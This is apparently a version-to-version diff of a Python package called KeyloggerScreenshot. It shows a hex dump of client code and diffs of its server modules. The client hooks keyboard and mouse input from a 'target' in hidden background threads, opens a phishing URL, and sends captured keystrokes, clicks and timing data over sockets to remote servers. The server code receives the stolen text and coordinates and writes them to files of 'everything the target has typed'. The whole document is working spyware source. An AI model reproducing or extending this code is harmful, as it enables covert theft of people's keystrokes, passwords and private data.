+00002a90: 6967 655f 6c69 7374 6520 2b3d 2022 7b22  ige_liste += "{"
+00002aa0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002ab0: 2020 2320 4966 2074 6865 2074 6172 6765    # If the targe
+00002ac0: 7420 7072 6573 7365 7320 7461 6220 6f72  t presses tab or
+00002ad0: 2073 7061 6365 2061 2022 7b22 2077 696c   space a "{" wil
+00002ae0: 6c20 6265 2061 7070 656e 6465 6420 746f  l be appended to
+00002af0: 2074 6865 206c 6973 7420 736f 2074 6865   the list so the
+00002b00: 2061 7474 6163 6b65 7220 6b6e 6f77 7320   attacker knows 
+00002b10: 7768 656e 2061 6e64 0d0a 2020 2020 2020  when and..      
+00002b20: 2020 2020 2020 2020 2020 2320 7370 6163            # spac
+00002b30: 6520 6f72 2061 2074 6162 206b 6579 2068  e or a tab key h
+00002b40: 6173 2062 6565 6e20 7072 6573 7365 640d  as been pressed.
+00002b50: 0a20 2020 2020 2020 2020 2020 2065 6c69  .            eli
+00002b60: 6620 6b65 7920 3d3d 206b 6579 626f 6172  f key == keyboar
+00002b70: 642e 4b65 792e 6361 7073 5f6c 6f63 6b3a  d.Key.caps_lock:
+00002b80: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002b90: 2020 7365 6c66 2e63 6170 7320 3d20 5472    self.caps = Tr
+00002ba0: 7565 0d0a 2020 2020 2020 2020 2020 2020  ue..            
+00002bb0: 2020 2020 7365 6c66 2e63 6865 636b 2e61      self.check.a
+00002bc0: 7070 656e 6428 3129 0d0a 2020 2020 2020  ppend(1)..      
+00002bd0: 2020 2020 2020 6368 6563 6b5f 6361 7073        check_caps
+00002be0: 203d 2073 756d 2873 656c 662e 6368 6563   = sum(self.chec
+00002bf0: 6b29 202f 2032 0d0a 2020 2020 2020 2020  k) / 2..        
+00002c00: 2020 2020 2320 4966 2063 6865 636b 5f63      # If check_c
+00002c10: 6170 7320 6973 206e 6f74 2070 7269 6d61  aps is not prima
+00002c20: 7279 2069 7420 7769 6c6c 2073 6574 2073  ry it will set s
+00002c30: 656c 662e 6361 7073 2074 6f20 4661 6c73  elf.caps to Fals
+00002c40: 650d 0a0d 0a20 2020 2020 2020 2020 2020  e....           
+00002c50: 2069 6620 7374 7228 6368 6563 6b5f 6361   if str(check_ca
+00002c60: 7073 295b 2d31 5d20 213d 2027 3027 3a0d  ps)[-1] != '0':.
 00002c70: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00002c80: 2065 7863 6570 7420 7265 7175 6573 7473   except requests
-00002c90: 2e65 7863 6570 7469 6f6e 732e 436f 6e6e  .exceptions.Conn
-00002ca0: 6563 7469 6f6e 4572 726f 723a 0d0a 2020  ectionError:..  
-00002cb0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00002cc0: 2020 7072 696e 7428 224e 6f20 636f 6e6e    print("No conn
-00002cd0: 6563 7469 6f6e 2229 0d0a 2020 2020 2020  ection")..      
-00002ce0: 2020 2020 2020 2020 2020 2020 2020 7379                sy
-00002cf0: 732e 6578 6974 2829 0d0a 0d0a 2020 2020  s.exit()....    
-00002d00: 2020 2020 6c69 7374 656e 696e 675f 7468      listening_th
-00002d10: 7265 6164 203d 2074 6872 6561 6469 6e67  read = threading
-00002d20: 2e54 6872 6561 6428 7461 7267 6574 3d73  .Thread(target=s
-00002d30: 656c 662e 6461 7465 6e5f 6175 666e 6568  elf.daten_aufneh
-00002d40: 656d 656e 290d 0a20 2020 2020 2020 2023  emen)..        #
-00002d50: 2054 6869 7320 7275 6e73 2074 6865 2070   This runs the p
-00002d60: 726f 6772 616d 6d20 6265 6869 6e64 2074  rogramm behind t
-00002d70: 6865 2061 6374 7561 6c20 7072 6f67 7261  he actual progra
-00002d80: 6d6d 696e 670d 0a20 2020 2020 2020 206c  mming..        l
-00002d90: 6973 7465 6e69 6e67 5f74 6872 6561 642e  istening_thread.
-00002da0: 7374 6172 7428 290d 0a0d 0a20 2020 2020  start()....     
-00002db0: 2020 2074 6872 6561 6469 6e67 5f6d 6f75     threading_mou
-00002dc0: 7365 203d 2074 6872 6561 6469 6e67 2e54  se = threading.T
-00002dd0: 6872 6561 6428 7461 7267 6574 3d73 656c  hread(target=sel
-00002de0: 662e 616c 6c5f 636c 6963 6b73 290d 0a20  f.all_clicks).. 
-00002df0: 2020 2020 2020 2023 2054 6869 7320 7275         # This ru
-00002e00: 6e73 2074 6865 2070 726f 6772 616d 6d20  ns the programm 
-00002e10: 6265 6869 6e64 2074 6865 2061 6374 7561  behind the actua
-00002e20: 6c20 7072 6f67 7261 6d6d 696e 670d 0a20  l programming.. 
-00002e30: 2020 2020 2020 2074 6872 6561 6469 6e67         threading
-00002e40: 5f6d 6f75 7365 2e73 7461 7274 2829 0d0a  _mouse.start()..
-00002e50: 0d0a 2020 2020 2020 2020 7365 6e64 5f74  ..        send_t
-00002e60: 696d 6572 203d 2073 6f63 6b65 742e 736f  imer = socket.so
-00002e70: 636b 6574 2873 6f63 6b65 742e 4146 5f49  cket(socket.AF_I
-00002e80: 4e45 542c 2073 6f63 6b65 742e 534f 434b  NET, socket.SOCK
-00002e90: 5f53 5452 4541 4d29 0d0a 2020 2020 2020  _STREAM)..      
-00002ea0: 2020 7365 6e64 5f74 696d 6572 2e63 6f6e    send_timer.con
-00002eb0: 6e65 6374 2828 7365 6c66 2e69 705f 7469  nect((self.ip_ti
-00002ec0: 6d65 722c 2073 656c 662e 706f 7274 5f74  mer, self.port_t
-00002ed0: 696d 6572 2929 0d0a 0d0a 2020 2020 2020  imer))....      
-00002ee0: 2020 7365 6e64 5f74 696d 6572 2e73 656e    send_timer.sen
-00002ef0: 6428 7374 7228 7365 6c66 2e64 7572 6174  d(str(self.durat
-00002f00: 696f 6e29 2e65 6e63 6f64 6528 2929 0d0a  ion).encode())..
-00002f10: 2020 2020 2020 2020 2320 5468 6973 2073          # This s
-00002f20: 656e 6473 2074 6865 2073 6563 6f6e 6473  ends the seconds
-00002f30: 2074 6f20 7468 6520 7365 7276 6572 0d0a   to the server..
-00002f40: 2020 2020 2020 2020 7365 6e64 5f74 696d          send_tim
-00002f50: 6572 2e63 6c6f 7365 2829 0d0a 0d0a 2020  er.close()....  
-00002f60: 2020 2020 2020 7769 7468 206b 6579 626f        with keybo
-00002f70: 6172 642e 4c69 7374 656e 6572 286f 6e5f  ard.Listener(on_
-00002f80: 7072 6573 733d 7365 6c66 2e6f 6e5f 7072  press=self.on_pr
-00002f90: 6573 732c 206f 6e5f 7265 6c65 6173 653d  ess, on_release=
-00002fa0: 7365 6c66 2e6f 6e5f 7265 6c65 6173 6529  self.on_release)
-00002fb0: 2061 7320 6c69 7374 656e 6572 3a0d 0a20   as listener:.. 
-00002fc0: 2020 2020 2020 2020 2020 2073 656c 662e             self.
-00002fd0: 636f 756e 7464 6f77 6e5f 7365 6e64 2873  countdown_send(s
-00002fe0: 656c 662e 6475 7261 7469 6f6e 2c20 7365  elf.duration, se
-00002ff0: 6c66 2e69 705f 7068 6f74 6f73 2c20 7365  lf.ip_photos, se
-00003000: 6c66 2e70 6f72 745f 7068 6f74 6f73 2c20  lf.port_photos, 
-00003010: 7365 6c66 2e69 705f 6b65 796c 6f67 6765  self.ip_keylogge
-00003020: 722c 0d0a 2020 2020 2020 2020 2020 2020  r,..            
-00003030: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00003040: 2020 2020 7365 6c66 2e70 6f72 745f 6b65      self.port_ke
-00003050: 796c 6f67 6765 7229 0d0a 2020 2020 2020  ylogger)..      
-00003060: 2020 2020 2020 6c69 7374 656e 6572 2e6a        listener.j
-00003070: 6f69 6e28 290d 0a20 2020 2020 2020 2020  oin()..         
-00003080: 2020 2023 2054 6869 7320 6c69 7374 656e     # This listen
-00003090: 7320 746f 2074 6865 206b 6579 7320 7468  s to the keys th
-000030a0: 6174 2077 6865 7265 2074 7970 6564 0d0a  at where typed..
+00002c80: 2070 6173 730d 0a20 2020 2020 2020 2020   pass..         
+00002c90: 2020 2065 6c73 653a 0d0a 2020 2020 2020     else:..      
+00002ca0: 2020 2020 2020 2020 2020 7365 6c66 2e63            self.c
+00002cb0: 6170 7320 3d20 4661 6c73 650d 0a20 2020  aps = False..   
+00002cc0: 2020 2020 2020 2020 2020 2020 2023 2054               # T
+00002cd0: 6869 7320 7265 7365 7473 2065 7665 7279  his resets every
+00002ce0: 7468 696e 670d 0a0d 0a20 2020 2020 2020  thing....       
+00002cf0: 2020 2020 2069 6620 6b65 7920 3d3d 206b       if key == k
+00002d00: 6579 626f 6172 642e 4b65 792e 6261 636b  eyboard.Key.back
+00002d10: 7370 6163 653a 0d0a 2020 2020 2020 2020  space:..        
+00002d20: 2020 2020 2020 2020 6474 203d 2064 6174          dt = dat
+00002d30: 6574 696d 652e 6e6f 7728 290d 0a20 2020  etime.now()..   
+00002d40: 2020 2020 2020 2020 2020 2020 2023 2047               # G
+00002d50: 6574 7320 7468 6520 6375 7272 656e 7420  ets the current 
+00002d60: 7469 6d65 0d0a 2020 2020 2020 2020 2020  time..          
+00002d70: 2020 2020 2020 6765 745f 7469 6d65 203d        get_time =
+00002d80: 2073 7472 2864 7429 2e73 706c 6974 2822   str(dt).split("
+00002d90: 3a22 290d 0a20 2020 2020 2020 2020 2020  :")..           
+00002da0: 2020 2020 2023 2054 6869 7320 7370 6c69       # This spli
+00002db0: 7473 2074 6865 2074 696d 6520 736f 2074  ts the time so t
+00002dc0: 6865 206d 696e 7574 6573 2061 6e64 2073  he minutes and s
+00002dd0: 6563 6f6e 6473 2061 7265 2064 6973 706c  econds are displ
+00002de0: 6179 6564 0d0a 0d0a 2020 2020 2020 2020  ayed....        
+00002df0: 2020 2020 2020 2020 686f 7572 2c20 6d69          hour, mi
+00002e00: 6e75 7465 732c 2073 6563 203d 2069 6e74  nutes, sec = int
+00002e10: 2867 6574 5f74 696d 655b 305d 5b3a 3a2d  (get_time[0][::-
+00002e20: 315d 5b30 3a32 5d5b 3a3a 2d31 5d29 2c20  1][0:2][::-1]), 
+00002e30: 696e 7428 6765 745f 7469 6d65 5b31 5d29  int(get_time[1])
+00002e40: 2c20 666c 6f61 7428 6765 745f 7469 6d65  , float(get_time
+00002e50: 5b32 5d29 0d0a 2020 2020 2020 2020 2020  [2])..          
+00002e60: 2020 2020 2020 2320 4765 7473 2074 6865        # Gets the
+00002e70: 2063 7572 7265 6e74 2068 6f75 722c 206d   current hour, m
+00002e80: 696e 7574 6520 616e 6420 7365 636f 6e64  inute and second
+00002e90: 0d0a 0d0a 2020 2020 2020 2020 2020 2020  ....            
+00002ea0: 2020 2020 616c 6c20 3d20 686f 7572 202a      all = hour *
+00002eb0: 2033 3630 3020 2b20 6d69 6e75 7465 7320   3600 + minutes 
+00002ec0: 2a20 3630 202b 2073 6563 0d0a 2020 2020  * 60 + sec..    
+00002ed0: 2020 2020 2020 2020 2020 2020 2320 4765              # Ge
+00002ee0: 7473 2074 6865 2073 6563 6f6e 6473 206f  ts the seconds o
+00002ef0: 6620 6576 6572 7974 6869 6e67 2066 726f  f everything fro
+00002f00: 6d20 686f 7572 2074 6f20 7365 636f 6e64  m hour to second
+00002f10: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+00002f20: 2020 6966 206e 6f74 2073 656c 662e 7365    if not self.se
+00002f30: 636f 6e64 733a 0d0a 2020 2020 2020 2020  conds:..        
+00002f40: 2020 2020 2020 2020 2020 2020 2320 4966              # If
+00002f50: 2074 6865 7265 2069 7320 6e6f 7468 696e   there is nothin
+00002f60: 6720 696e 2074 6865 206c 6973 7420 7365  g in the list se
+00002f70: 636f 6e64 2077 696c 6c20 6265 2061 7070  cond will be app
+00002f80: 616e 6465 640d 0a20 2020 2020 2020 2020  anded..         
+00002f90: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00002fa0: 7365 636f 6e64 732e 6170 7065 6e64 2861  seconds.append(a
+00002fb0: 6c6c 290d 0a20 2020 2020 2020 2020 2020  ll)..           
+00002fc0: 2020 2020 206d 696e 7573 203d 2061 6c6c       minus = all
+00002fd0: 202d 2073 656c 662e 7365 636f 6e64 735b   - self.seconds[
+00002fe0: 305d 0d0a 2020 2020 2020 2020 2020 2020  0]..            
+00002ff0: 2020 2020 2320 5468 6973 2063 6865 636b      # This check
+00003000: 7320 6966 2074 6865 2074 6172 6765 7420  s if the target 
+00003010: 6973 2068 6f6c 6469 6e67 2074 6865 2062  is holding the b
+00003020: 6163 6b73 7061 6365 206b 6579 0d0a 2020  ackspace key..  
+00003030: 2020 2020 2020 2020 2020 2020 2020 6966                if
+00003040: 206d 696e 7573 203e 2030 2e30 3520 6f72   minus > 0.05 or
+00003050: 206d 696e 7573 203d 3d20 302e 303a 0d0a   minus == 0.0:..
+00003060: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003070: 2020 2020 6966 2073 656c 662e 7269 6368      if self.rich
+00003080: 7469 6765 5f6c 6973 7465 3a0d 0a20 2020  tige_liste:..   
+00003090: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000030a0: 2020 2020 2073 656c 662e 7269 6368 7469       self.richti
+000030b0: 6765 5f6c 6973 7465 2e70 6f70 282d 3129  ge_liste.pop(-1)
+000030c0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
+000030d0: 2020 2020 2020 2020 2020 2320 5265 6d6f            # Remo
+000030e0: 7665 7320 7468 6520 6c61 7374 2069 7465  ves the last ite
+000030f0: 6d20 6f66 2074 6865 206c 6973 740d 0a0d  m of the list...
+00003100: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
+00003110: 2073 656c 662e 7365 636f 6e64 735b 305d   self.seconds[0]
+00003120: 203d 2061 6c6c 0d0a 2020 2020 2020 2020   = all..        
+00003130: 2020 2020 2020 2020 2320 4c69 7374 2077          # List w
+00003140: 696c 6c20 616c 6c77 6179 7320 6265 2075  ill allways be u
+00003150: 7064 6174 6564 0d0a 0d0a 2020 2020 6465  pdated....    de
+00003160: 6620 6f6e 5f72 656c 6561 7365 2873 656c  f on_release(sel
+00003170: 662c 206b 6579 293a 0d0a 2020 2020 2020  f, key):..      
+00003180: 2020 7072 696e 7428 6627 4b65 7920 7265    print(f'Key re
+00003190: 6c65 6173 6564 3a20 7b6b 6579 7d27 290d  leased: {key}').
+000031a0: 0a0d 0a20 2020 2064 6566 2073 7461 7274  ...    def start
+000031b0: 2873 656c 6629 3a0d 0a20 2020 2020 2020  (self):..       
+000031c0: 2069 6620 7365 6c66 2e70 6869 7368 696e   if self.phishin
+000031d0: 6720 6973 206e 6f74 204e 6f6e 653a 0d0a  g is not None:..
+000031e0: 2020 2020 2020 2020 2020 2020 7768 696c              whil
+000031f0: 6520 5472 7565 3a0d 0a20 2020 2020 2020  e True:..       
+00003200: 2020 2020 2020 2020 2074 7279 3a0d 0a20           try:.. 
+00003210: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00003220: 2020 2072 6573 706f 6e73 6520 3d20 7265     response = re
+00003230: 7175 6573 7473 2e67 6574 2873 656c 662e  quests.get(self.
+00003240: 7068 6973 6869 6e67 290d 0a20 2020 2020  phishing)..     
+00003250: 2020 2020 2020 2020 2020 2020 2020 2023                 #
+00003260: 2052 6573 706f 6e65 2069 7320 6865 7265   Respone is here
+00003270: 2074 6f20 7365 6520 6966 2074 6865 2077   to see if the w
+00003280: 6562 7369 7465 2069 7320 6f6e 6c69 6e65  ebsite is online
+00003290: 206f 7220 6e6f 740d 0a20 2020 2020 2020   or not..       
+000032a0: 2020 2020 2020 2020 2020 2020 2077 6562               web
+000032b0: 6272 6f77 7365 722e 6f70 656e 2873 656c  browser.open(sel
+000032c0: 662e 7068 6973 6869 6e67 290d 0a20 2020  f.phishing)..   
+000032d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000032e0: 2062 7265 616b 0d0a 0d0a 2020 2020 2020   break....      
+000032f0: 2020 2020 2020 2020 2020 6578 6365 7074            except
+00003300: 2072 6571 7565 7374 732e 6578 6365 7074   requests.except
+00003310: 696f 6e73 2e43 6f6e 6e65 6374 696f 6e45  ions.ConnectionE
+00003320: 7272 6f72 3a0d 0a20 2020 2020 2020 2020  rror:..         
+00003330: 2020 2020 2020 2020 2020 2070 7269 6e74             print
+00003340: 2822 4e6f 2063 6f6e 6e65 6374 696f 6e22  ("No connection"
+00003350: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
+00003360: 2020 2020 2020 2073 7973 2e65 7869 7428         sys.exit(
+00003370: 290d 0a0d 0a20 2020 2020 2020 206c 6973  )....        lis
+00003380: 7465 6e69 6e67 5f74 6872 6561 6420 3d20  tening_thread = 
+00003390: 7468 7265 6164 696e 672e 5468 7265 6164  threading.Thread
+000033a0: 2874 6172 6765 743d 7365 6c66 2e64 6174  (target=self.dat
+000033b0: 656e 5f61 7566 6e65 6865 6d65 6e29 0d0a  en_aufnehemen)..
+000033c0: 2020 2020 2020 2020 2320 5468 6973 2072          # This r
+000033d0: 756e 7320 7468 6520 7072 6f67 7261 6d6d  uns the programm
+000033e0: 2062 6568 696e 6420 7468 6520 6163 7475   behind the actu
+000033f0: 616c 2070 726f 6772 616d 6d69 6e67 0d0a  al programming..
+00003400: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
+00003410: 675f 7468 7265 6164 2e73 7461 7274 2829  g_thread.start()
+00003420: 0d0a 0d0a 2020 2020 2020 2020 7468 7265  ....        thre
+00003430: 6164 696e 675f 6d6f 7573 6520 3d20 7468  ading_mouse = th
+00003440: 7265 6164 696e 672e 5468 7265 6164 2874  reading.Thread(t
+00003450: 6172 6765 743d 7365 6c66 2e61 6c6c 5f63  arget=self.all_c
+00003460: 6c69 636b 7329 0d0a 2020 2020 2020 2020  licks)..        
+00003470: 2320 5468 6973 2072 756e 7320 7468 6520  # This runs the 
+00003480: 7072 6f67 7261 6d6d 2062 6568 696e 6420  programm behind 
+00003490: 7468 6520 6163 7475 616c 2070 726f 6772  the actual progr
+000034a0: 616d 6d69 6e67 0d0a 2020 2020 2020 2020  amming..        
+000034b0: 7468 7265 6164 696e 675f 6d6f 7573 652e  threading_mouse.
+000034c0: 7374 6172 7428 290d 0a0d 0a20 2020 2020  start()....     
+000034d0: 2020 2073 656e 645f 7469 6d65 7220 3d20     send_timer = 
+000034e0: 736f 636b 6574 2e73 6f63 6b65 7428 736f  socket.socket(so
+000034f0: 636b 6574 2e41 465f 494e 4554 2c20 736f  cket.AF_INET, so
+00003500: 636b 6574 2e53 4f43 4b5f 5354 5245 414d  cket.SOCK_STREAM
+00003510: 290d 0a20 2020 2020 2020 2073 656e 645f  )..        send_
+00003520: 7469 6d65 722e 636f 6e6e 6563 7428 2873  timer.connect((s
+00003530: 656c 662e 6970 5f74 696d 6572 2c20 7365  elf.ip_timer, se
+00003540: 6c66 2e70 6f72 745f 7469 6d65 7229 290d  lf.port_timer)).
+00003550: 0a0d 0a20 2020 2020 2020 2073 656e 645f  ...        send_
+00003560: 7469 6d65 722e 7365 6e64 2873 7472 2873  timer.send(str(s
+00003570: 656c 662e 6475 7261 7469 6f6e 292e 656e  elf.duration).en
+00003580: 636f 6465 2829 290d 0a20 2020 2020 2020  code())..       
+00003590: 2023 2054 6869 7320 7365 6e64 7320 7468   # This sends th
+000035a0: 6520 7365 636f 6e64 7320 746f 2074 6865  e seconds to the
+000035b0: 2073 6572 7665 720d 0a20 2020 2020 2020   server..       
+000035c0: 2073 656e 645f 7469 6d65 722e 636c 6f73   send_timer.clos
+000035d0: 6528 290d 0a0d 0a20 2020 2020 2020 2074  e()....        t
+000035e0: 696d 6572 5f64 656c 6574 655f 6469 7220  imer_delete_dir 
+000035f0: 3d20 736f 636b 6574 2e73 6f63 6b65 7428  = socket.socket(
+00003600: 736f 636b 6574 2e41 465f 494e 4554 2c20  socket.AF_INET, 
+00003610: 736f 636b 6574 2e53 4f43 4b5f 5354 5245  socket.SOCK_STRE
+00003620: 414d 290d 0a20 2020 2020 2020 2074 696d  AM)..        tim
+00003630: 6572 5f64 656c 6574 655f 6469 722e 636f  er_delete_dir.co
+00003640: 6e6e 6563 7428 2822 3132 372e 302e 302e  nnect(("127.0.0.
+00003650: 3122 2c20 3130 3737 2929 0d0a 0d0a 2020  1", 1077))....  
+00003660: 2020 2020 2020 7469 6d65 725f 6465 6c65        timer_dele
+00003670: 7465 5f64 6972 2e73 656e 6428 7374 7228  te_dir.send(str(
+00003680: 7365 6c66 2e64 7572 6174 696f 6e29 2e65  self.duration).e
+00003690: 6e63 6f64 6528 2929 0d0a 2020 2020 2020  ncode())..      
+000036a0: 2020 7469 6d65 725f 6465 6c65 7465 5f64    timer_delete_d
+000036b0: 6972 2e63 6c6f 7365 2829 0d0a 0d0a 2020  ir.close()....  
+000036c0: 2020 2020 2020 7769 7468 206b 6579 626f        with keybo
+000036d0: 6172 642e 4c69 7374 656e 6572 286f 6e5f  ard.Listener(on_
+000036e0: 7072 6573 733d 7365 6c66 2e6f 6e5f 7072  press=self.on_pr
+000036f0: 6573 732c 206f 6e5f 7265 6c65 6173 653d  ess, on_release=
+00003700: 7365 6c66 2e6f 6e5f 7265 6c65 6173 6529  self.on_release)
+00003710: 2061 7320 6c69 7374 656e 6572 3a0d 0a20   as listener:.. 
+00003720: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00003730: 636f 756e 7464 6f77 6e5f 7365 6e64 2873  countdown_send(s
+00003740: 656c 662e 6475 7261 7469 6f6e 2c20 7365  elf.duration, se
+00003750: 6c66 2e69 705f 7068 6f74 6f73 2c20 7365  lf.ip_photos, se
+00003760: 6c66 2e70 6f72 745f 7068 6f74 6f73 2c20  lf.port_photos, 
+00003770: 7365 6c66 2e69 705f 6b65 796c 6f67 6765  self.ip_keylogge
+00003780: 722c 0d0a 2020 2020 2020 2020 2020 2020  r,..            
+00003790: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000037a0: 2020 2020 7365 6c66 2e70 6f72 745f 6b65      self.port_ke
+000037b0: 796c 6f67 6765 7229 0d0a 2020 2020 2020  ylogger)..      
+000037c0: 2020 2020 2020 6c69 7374 656e 6572 2e6a        listener.j
+000037d0: 6f69 6e28 290d 0a20 2020 2020 2020 2020  oin()..         
+000037e0: 2020 2023 2054 6869 7320 6c69 7374 656e     # This listen
+000037f0: 7320 746f 2074 6865 206b 6579 7320 7468  s to the keys th
+00003800: 6174 2077 6865 7265 2074 7970 6564 0d0a  at where typed..
```

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Port_data.py` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Port_data.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_keylogger.py` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_keylogger.py`

 * *Files 11% similar despite different names*

```diff
@@ -11,28 +11,54 @@
     # This is the class of the Server. Both Server should not be in the same file
     def __init__(self, ip, port, simulater=False):
         self.ip = ip
         self.port = port
         self.simulater = simulater
         self.new_data = None
         self.check_under = False
+        self.new_cor = None
+        self.full_msg = None
+        self.cord = None
+
+    def do_file(self, spalten):
+        if spalten != "":
+            # If the data is not empty
+            text = spalten
+            for zeichen in text:
+                if "{" == zeichen:
+                    text = text.replace("{", " ")
+            bp.color(f"Text of target: {text}", "magenta")
+            zeit = time.strftime("%H-%M-%S-%Y")
+            # This is the time the data has arrived
+            with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
+                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
+                # That means data will appear even if the connection isn't stabled
+        else:
+            bp.color("The target hasn't written something in the meanwhile", "magenta")
+
+    @staticmethod
+    def terminator():
+        bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
+        bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
+        bp.color("TO RUN A SIMULATION RUN THE 'Simulation_code.py' SCRIPT\nIF YOU DONT HAVE ONE YOU CAN CREATE IT ON GITHUB\nALL THE INSTRUCTIONS ARE THERE: https://github.com/Kill0ger/KeyloggerScreenshot\n\nTHANK YOU FOR USING KEYLOGGERSCREENSHOT","magenta")
+        os._exit(0)
 
     def message(self, real_data):
         # To know if the server has some issues
         for zeichen in real_data:
             if "{" == zeichen:
-                # "{" this detects if a space or a tab is in full_msg
+                # "{" this detects if a space or a tab is in self.full_msg
                 self.new_data = real_data.replace("{", " ")
                 self.check_under = True
 
         if self.check_under is False:
             self.new_data = real_data
 
         print(self.check_under)
-        # The data is being stored in full_msg
+        # The data is being stored in self.full_msg
         bp.color(f"Text of target: {self.new_data}", "magenta")
         zeit = time.strftime("%H-%M-%S-%Y")
         # This is the time the data has arrived
         if self.new_data != "":
             with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                 file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{self.new_data}")
 
@@ -57,65 +83,55 @@
             server.listen(1000)
 
             bp.color("Waiting for connection....", "magenta")
             clientsocket, ipaddress = server.accept()
             # Data is in clientsocket and the ip-address is obviously in "ipaddress"
             bp.color(f"\nConnection has been established with {ipaddress}", "magenta")
 
-            full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
-            if ")]" in full_msg:
-                # Checks if the coordinates are there
-                cord = full_msg.split(")]")
-                new_cor = cord[0] + ")]"
-                direct = os.listdir()
+            self.full_msg = ServerPhotos.get_data(self, clientsocket, "r", 8192)
+            if ")]" in self.full_msg:
+                if "***%§§)§§%" in self.full_msg:
+                    self.new_cor = "[(" + self.full_msg.split("[(")[1]
+                    spalten = self.full_msg.split("[(")[0].split("***%§§)§§%")
+                    # This splits the data with the special code
+                    self.do_file(spalten[0])
+
+                else:
+                    # Checks if the coordinates are there
+                    self.cord = self.full_msg.split(")]")
+                    self.new_cor = self.cord[0] + ")]"
 
                 filename = self.check_double()
                 with open(filename, "a+") as file:
                     # The coordinates will be stored in "mouseInfoLog.txt"
-                    file.write(f"These are the coordinates of the target \n{new_cor}")
+                    file.write(f"These are the coordinates of the target \n{self.new_cor}")
                 bp.color("The coordinates of the target have been saved to your directory", "magenta")
 
-                if cord[1] == "":
-                    bp.color("The target hasn't typed anything", "magenta")
-                else:
-                    self.message(cord[1])
+                if "***%§§)§§%" in self.full_msg:
+                    ServerKeylogger.terminator()
+
+                if self.cord is not None:
+                    if self.cord[1] == "":
+                        bp.color("The target hasn't typed anything", "magenta")
+                    else:
+                        self.message(self.cord[1])
 
-            elif "{" in full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
+            elif "{" in self.full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in self.full_msg:
                 # This checks if the target hasn't clicked something and if there is still some data
-                full_msg = full_msg.replace("[]", "")
+                self.full_msg = self.full_msg.replace("[]", "")
                 bp.color("The target hasn't clicked anything", "magenta")
-                self.message(full_msg)
+                self.message(self.full_msg)
 
-            elif "[]" == full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
+            elif "[]" == self.full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in self.full_msg:
                 # Checks if nothing has typed or clicked
                 bp.color("The target hasn't typed and clicked anything", "magenta")
-
-            else:
-                spalten = full_msg.split("***%§§)§§%")
-                # This splits the data with the special code
-                if spalten[1] != "":
-                    # If the data is not empty
-                    text = spalten[1]
-                    for zeichen in text:
-                        if "{" == zeichen:
-                            text = text.replace("{", " ")
-                    bp.color(f"Text of target: {text}", "magenta")
-                    zeit = time.strftime("%H-%M-%S-%Y")
-                    # This is the time the data has arrived
-                    with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
-                        file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
-                        # That means data will appear even if the connection isn't stabled
-                else:
-                    bp.color("The target hasn't written something in the meanwhile", "magenta")
-
-                bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
-                bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
-                os._exit(0)
                 # This shuts down the server
-
+            else:
+                self.do_file(self.full_msg.split("***%§§)§§%")[1])
+                ServerKeylogger.terminator()
 
             if self.simulater is True:
                 print("Simulation will come in 10 seconds!!!")
                 time.sleep(10)
                 start = input("Do you want to start y/n?: ")
                 if start not in ["y", "yes"]:
                     print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
```

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_listener.py` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_listener.py`

 * *Files 1% similar despite different names*

```diff
@@ -58,8 +58,8 @@
 
             # This stores everything the target was talking
 
         except OSError:
             working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERLISTENER. PORT NUMBER: {self.port} already in use","green")
-                os._exit(0)
+                sys.exit()
```

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_photos.py` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_photos.py`

 * *Files 0% similar despite different names*

```diff
@@ -79,8 +79,9 @@
                 # Detetcts how many Image have been saved to your directory
 
 
         except OSError:
             working_port = Ports.get_working_ports()
             if str(self.port) in working_port:
                 bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERPHOTOS. PORT NUMBER: {self.port} already in use", "cyan")
-                os._exit(0)
+                os._exit(0)
+
```

### Comparing `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_timer.py` & `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_timer.py`

 * *Files 7% similar despite different names*

```diff
@@ -41,8 +41,9 @@
             seconds = int(full_msg)
